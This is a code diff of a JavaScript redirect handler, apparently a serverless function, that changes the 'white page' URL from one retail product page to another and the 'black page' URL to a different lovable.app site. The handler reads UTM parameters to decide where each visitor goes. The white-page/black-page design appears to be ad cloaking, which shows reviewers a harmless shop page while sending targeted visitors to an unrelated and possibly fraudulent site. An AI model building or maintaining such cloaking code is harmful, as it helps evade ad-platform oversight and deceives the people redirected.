@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ubuy.com.sa/en/product/4LMRTPGG4-aboosam-baby-toys-6-to-12-months-musical-learning-infant-toys-12-18-months-babies-ocean-rotating-light-up-toys-for-toddlers-1-2-3-years-old-boys?srsltid=AfmBOop6D-r9YIc9g4OEpu-JPqGFtPpiEs8cRrD7shgAybkIZD27Dre0";
-    const blackPageURL = "https://luvcshap.lovable.app/?";
+    const whitePageURL = "https://www.americaneagle.ae/en/american-eagle/buy-ae-graphic-t-shirt-camo-green";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
